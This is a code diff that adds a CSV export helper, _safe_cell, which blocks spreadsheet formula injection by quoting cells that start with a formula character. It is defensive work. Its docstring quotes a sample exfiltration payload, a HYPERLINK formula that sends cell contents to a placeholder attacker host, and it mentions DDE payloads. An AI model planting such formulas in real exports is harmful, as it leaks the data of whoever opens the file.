@@ -617,13 +617,49 @@ def _dt(value) -> str:
     return value.isoformat() if value else ""
 
 
+# Characters that make a spreadsheet read a cell as a formula rather than as
+# text. `=`, `+`, `-` and `@` are the four Excel/LibreOffice/Sheets act on;
+# a leading tab or carriage return gets stripped on paste and hands the next
+# character the same power.
+_FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")
+
+# A cell that is just a number is not a formula in any spreadsheet, so
+# leaving it alone costs nothing in safety and keeps a numeric column
+# sortable. Everything else is quoted.
+_PLAIN_NUMBER = re.compile(r"^[+-]?\d+(?:\.\d+)?$")
+
+
+def _safe_cell(value):
+    """One exported cell, neutralised against CSV formula injection.
+
+    Not every character in an export is written by the student. A third
+    party's email Subject header reaches `Touch.note` verbatim through the
+    Gmail capture path (capture/gmail_live.py builds evidence text like
+    `f"Sent: {subject}"`), so anyone who can send that student mail can
+    choose the first character of a cell in their export. Left as-is,
+    `=HYPERLINK("http://attacker/?x="&A1,"click")` or a DDE payload runs on
+    the student's own machine the moment they open the file in Excel --
+    the CSV never touched a browser, so none of the app's escaping applies.
+
+    The mitigation is OWASP's: prefix a leading formula character with a
+    single quote. The spreadsheet shows the original text and evaluates
+    nothing. Applied here, in the one helper every export builder goes
+    through, so a new export cannot ship without it.
+    """
+    text = "" if value is None else str(value)
+    if text[:1] in _FORMULA_LEAD and not _PLAIN_NUMBER.match(text):
+        return "'" + text
+    return value
+
+
 def _csv(columns: list[str], rows) -> str:
     """Header + rows -> CSV text. Every builder below is this plus a query."""
     buf = io.StringIO()
     writer = csv.writer(buf)
+    # Column headers are literals declared in this module, never user text.
     writer.writerow(columns)
     for row in rows:
-        writer.writerow(row)
+        writer.writerow([_safe_cell(cell) for cell in row])
     return buf.getvalue()
 
 
